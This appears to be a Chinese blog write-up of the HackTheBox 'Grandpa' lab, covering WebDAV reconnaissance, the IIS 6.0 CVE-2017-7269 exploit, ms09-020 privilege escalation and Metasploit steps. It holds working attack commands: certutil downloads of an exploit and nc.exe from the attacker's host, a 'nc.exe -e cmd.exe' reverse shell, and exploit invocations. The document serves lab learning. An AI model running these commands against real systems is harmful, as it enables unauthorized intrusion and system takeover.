@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>HTB: Grandpa - T0x1c</title>
+
+  
+    <meta name="description" content="Granpa是一个简单的靶机，其中主要涉及WebDav RCE漏洞、ms14-070内核提权以及ms09-020内核提权的相关知识，相比于Granny中的文件上传，CVE-2017-7269可以直接通过缓冲区溢出来获取权限。而使用MSF渗透框架的利用脚本可以帮助我们快速获取权限。感兴趣的同学可以在HackTheBox中进行学习。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB: Grandpa">
+<meta property="og:url" content="https://toxic80l.github.io/post/bf422474/index.html">
+<meta property="og:site_name" content="T0x1c">
+<meta property="og:description" content="Granpa是一个简单的靶机，其中主要涉及WebDav RCE漏洞、ms14-070内核提权以及ms09-020内核提权的相关知识，相比于Granny中的文件上传，CVE-2017-7269可以直接通过缓冲区溢出来获取权限。而使用MSF渗透框架的利用脚本可以帮助我们快速获取权限。感兴趣的同学可以在HackTheBox中进行学习。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0110.gif">
+<meta property="og:image" content="https://toxic80l.github.io/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8A%E5%8D%8810.46.29.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8A%E5%8D%8811.00.15.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%881.10.48.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%881.15.03.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%881.28.15.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%881.28.58.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%882.10.00.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%882.12.15.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%882.22.24.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%882.26.15.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%882.31.16.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%882.38.28.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%882.38.40.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%882.41.47.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%882.43.47.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%883.29.32.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%883.30.23.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%883.40.54.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%883.34.09.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%883.42.06.png">
+<meta property="article:published_time" content="2022-01-13T05:33:34.000Z">
+<meta property="article:modified_time" content="2022-01-13T07:23:52.763Z">
+<meta property="article:author" content="toxic80L">
+<meta property="article:tag" content="靶机">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0110.gif">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/medias/avatar.png"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">T0x1c</div><div class="sub cap">我在听你的独家记忆</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">Blog</a><a class="nav-item" href="/wiki/">Wiki</a><a class="nav-item" href="/notes/">notes</a><a class="nav-item" href="/friends/">more</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">TOC</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BE%A6%E6%9F%A5"><span class="toc-text">0x01 侦查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E6%8E%A2%E6%B5%8B"><span class="toc-text">扫描探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#80%E7%AB%AF%E5%8F%A3"><span class="toc-text">80端口</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E4%B8%8A%E7%BA%BF-network-service"><span class="toc-text">0x02 上线[network service]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#webdav%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-text">webdav漏洞检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IIS-6-0-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88cve-2017-7269%EF%BC%89"><span class="toc-text">IIS 6.0 任意代码执行漏洞（cve-2017-7269）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-system"><span class="toc-text">0x03 权限提升[system]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ms09-020%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%83"><span class="toc-text">ms09-020手工提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%9F%A5%E8%AF%A2"><span class="toc-text">本地提权漏洞查询</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-text">利用过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEflag"><span class="toc-text">寻找flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%80%9F%E5%8A%A9msf%E5%BF%AB%E9%80%9F%E6%8F%90%E6%9D%83"><span class="toc-text">借助msf快速提权</span></a></li></ol></li></ol></div></div></div>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/toxic80L" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.3/social/08a41b181ce68.svg"/></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a><span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/HackTheBox/">HackTheBox</a></div><div id="post-meta">Posted on&nbsp;<time datetime="2022-01-13T05:33:34.000Z">2022-01-13</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>HTB: Grandpa</span></h1>
+<p>Granpa是一个简单的靶机，其中主要涉及WebDav RCE漏洞、ms14-070内核提权以及ms09-020内核提权的相关知识，相比于Granny中的文件上传，CVE-2017-7269可以直接通过缓冲区溢出来获取权限。而使用MSF渗透框架的利用脚本可以帮助我们快速获取权限。感兴趣的同学可以在HackTheBox中进行学习。</p>
+<span id="more"></span>
+<span class="tag-plugin emoji"><img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0110.gif" style="height:3em" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></span>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8A%E5%8D%8810.46.29.png" alt="截屏2021-10-13 上午10.46.29"></p>
+<h2 id="0x01-侦查"><a href="#0x01-侦查" class="headerlink" title="0x01 侦查"></a>0x01 侦查</h2><h3 id="扫描探测"><a href="#扫描探测" class="headerlink" title="扫描探测"></a>扫描探测</h3><p>首先使用 nmap 对目标进行端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -sV -sC -A 10.10.10.14 -oA nmap_Grandpa</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8A%E5%8D%8811.00.15.png" alt="截屏2021-10-13 上午11.00.15"><br>根据扫描结果可以发现目标开放80端口，同时可以探测到该端口开放 WebDav 服务</p>
+<h4 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h4><p>访问<code>http://10.10.10.14</code>，网页显示网站正在建设中<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%881.10.48.png" alt="截屏2021-10-13 下午1.10.48"></p>
+<h2 id="0x02-上线-network-service"><a href="#0x02-上线-network-service" class="headerlink" title="0x02 上线[network service]"></a>0x02 上线[network service]</h2><h3 id="webdav漏洞检测"><a href="#webdav漏洞检测" class="headerlink" title="webdav漏洞检测"></a>webdav漏洞检测</h3><p>目前我们已知该站点的中间件为 IIs 6.0 且类型为webdav，支持的请求方法有</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">OPTIONS,</span> <span class="string">TRACE,</span> <span class="string">GET,</span> <span class="string">HEAD,</span> <span class="string">DELETE,</span> <span class="string">COPY,</span> <span class="string">MOVE,</span> <span class="string">PROPFIND,</span> <span class="string">PROPPATCH,</span> <span class="string">SEARCH,</span> <span class="string">MKCOL,</span> <span class="string">LOCK,</span> <span class="string">UNLOCK</span></span><br></pre></td></tr></table></figure>
+<p>使用 davtest 进行漏洞探测</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">davtest --url http://10.10.10.14</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%881.15.03.png" alt="截屏2021-10-13 下午1.15.03"><br>结果显示都失败，那说明无法我们无法像 Granny 中一样通过上传文件来拿到webshell</p>
+<h3 id="IIS-6-0-任意代码执行漏洞（cve-2017-7269）"><a href="#IIS-6-0-任意代码执行漏洞（cve-2017-7269）" class="headerlink" title="IIS 6.0 任意代码执行漏洞（cve-2017-7269）"></a>IIS 6.0 任意代码执行漏洞（cve-2017-7269）</h3><p>在寻找IIS 6.0中间件的其他漏洞过程中，我们选择IIS 6.0 任意代码执行漏洞（cve-2017-7269），它能针对IIS 6.0中的 WebDav 服务中的 ScStoragePathFromUrl 函数完成缓冲区溢出，攻击者只需要在 PROPFIND 请求中以<code>IF:&lt;http://</code>开头的长标头即可执行任意代码。<br><strong>项目地址1：<a target="_blank" rel="noopener" href="https://github.com/edwardz246003/IIS_exploit">https://github.com/edwardz246003/IIS_exploit</a></strong><br><strong>项目地址2：<a target="_blank" rel="noopener" href="https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269">https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269</a></strong></p>
+<p>首先下载利用脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269</span><br></pre></td></tr></table></figure>
+<p>在本地开启6666端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 6666</span><br></pre></td></tr></table></figure>
+<p>通过脚本攻击靶机</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exploit.py 10.10.10.14 80 10.10.14.5 6666</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%881.28.15.png" alt="截屏2021-10-13 下午1.28.15"><br>成功拿到反弹shell<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%881.28.58.png" alt="截屏2021-10-13 下午1.28.58"></p>
+<h2 id="0x03-权限提升-system"><a href="#0x03-权限提升-system" class="headerlink" title="0x03 权限提升[system]"></a>0x03 权限提升[system]</h2><h3 id="ms09-020手工提权"><a href="#ms09-020手工提权" class="headerlink" title="ms09-020手工提权"></a>ms09-020手工提权</h3><h4 id="本地提权漏洞查询"><a href="#本地提权漏洞查询" class="headerlink" title="本地提权漏洞查询"></a>本地提权漏洞查询</h4><p>获取系统信息<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%882.10.00.png" alt="截屏2021-10-13 下午2.10.00"><br>目标系统为 windows 2003，使用 Windows-Exploit-Suggester 查找相关漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python windows-exploit-suggester.py --database 2021-05-18-mssb.xls  --systeminfo systeminfo.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%882.12.15.png" alt="截屏2021-10-13 下午2.12.15"><br>选择 ms09-020 进行提权，其中 IIS6.0.exe 就是漏洞利用程序</p>
+<h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><p>首先本地开启http服务，用于传输 IIS6.0.exe 和 nc.exe</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/windows-resources/binaries/nc.exe .</span><br><span class="line">ls</span><br><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%882.22.24.png" alt="截屏2021-10-13 下午2.22.24"><br>在靶机中通过命令传输 IIS6.0.exe 和 nc.exe</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f <span class="string">&quot;http://10.10.14.5/IIS6.0.exe&quot;</span> IIS6.0.exe </span><br><span class="line">certutil -urlcache -split -f <span class="string">&quot;http://10.10.14.5/nc.exe&quot;</span> nc.exe </span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%882.26.15.png" alt="截屏2021-10-13 下午2.26.15"><br>传输出现错误，于是切换smb共享服务进行传输</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbserver.py mac ~/hackthebox/Grandpa</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%882.31.16.png" alt="截屏2021-10-13 下午2.31.16"><br>在本地监听2222端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 2222</span><br></pre></td></tr></table></figure>
+<p>在靶机中执行如下命令进行提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\10.10.14.5\mac\IIS6.0.exe <span class="string">&quot;\\10.10.14.5\mac\nc.exe -e cmd.exe 10.10.14.5 2222&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%882.38.28.png" alt="截屏2021-10-13 下午2.38.28"><br>成功获得system权限<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%882.38.40.png" alt="截屏2021-10-13 下午2.38.40"></p>
+<h3 id="寻找flag"><a href="#寻找flag" class="headerlink" title="寻找flag"></a>寻找flag</h3><p>分别在 Harry 和管理员的桌面上找到flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir <span class="string">&quot;c:\Documents and Settings\Harry\Desktop&quot;</span></span><br><span class="line"><span class="built_in">type</span> <span class="string">&quot;c:\Documents and Settings\Harry\Desktop\user.txt&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%882.41.47.png" alt="截屏2021-10-13 下午2.41.47"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir <span class="string">&quot;c:\Documents and Settings\Administrator\Desktop&quot;</span></span><br><span class="line"><span class="built_in">type</span> <span class="string">&quot;c:\Documents and Settings\Administrator\Desktop\root.txt&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%882.43.47.png" alt="截屏2021-10-13 下午2.43.47"></p>
+<h3 id="借助msf快速提权"><a href="#借助msf快速提权" class="headerlink" title="借助msf快速提权"></a>借助msf快速提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf &gt; use exploit/windows/iis/iis_webdav_scstoragepathfromurl</span><br><span class="line">msf &gt; <span class="built_in">set</span> rhosts 10.10.10.14</span><br><span class="line">msf &gt; <span class="built_in">set</span> lhost 10.10.14.5</span><br><span class="line">msf &gt; <span class="built_in">set</span> lport 8888</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%883.29.32.png" alt="截屏2021-10-13 下午3.29.32"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%883.30.23.png" alt="截屏2021-10-13 下午3.30.23"><br>成功反弹 meterpreter，需要注意的是这里要将当前进程注入到存在用户的进程中<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%883.40.54.png" alt="截屏2021-10-13 下午3.40.54"><br>通过 local_exploit_suggester 查看可提权漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use multi/recon/local_exploit_suggester</span><br><span class="line">msf &gt; <span class="built_in">set</span> session 1</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
